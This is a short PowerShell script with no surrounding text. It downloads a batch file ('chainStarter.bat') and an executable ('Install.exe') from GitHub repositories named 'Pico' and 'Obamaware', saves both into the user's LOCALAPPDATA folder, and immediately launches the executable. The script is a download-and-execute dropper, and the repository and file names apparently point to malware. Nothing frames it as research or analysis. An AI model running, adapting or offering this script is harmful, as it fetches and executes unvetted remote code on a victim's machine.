iwr 'https://raw.githubusercontent.com/RaupenInspektor/Pico/main/chainStarter.bat' -OutFile "$env:LOCALAPPDATA\start.bat"
iwr 'https://raw.githubusercontent.com/RaupenInspektor/Obamaware/main/Install.exe' -OutFile "$env:LOCALAPPDATA\install.exe"

Start-Process -FilePath "$env:LOCALAPPDATA\install.exe"
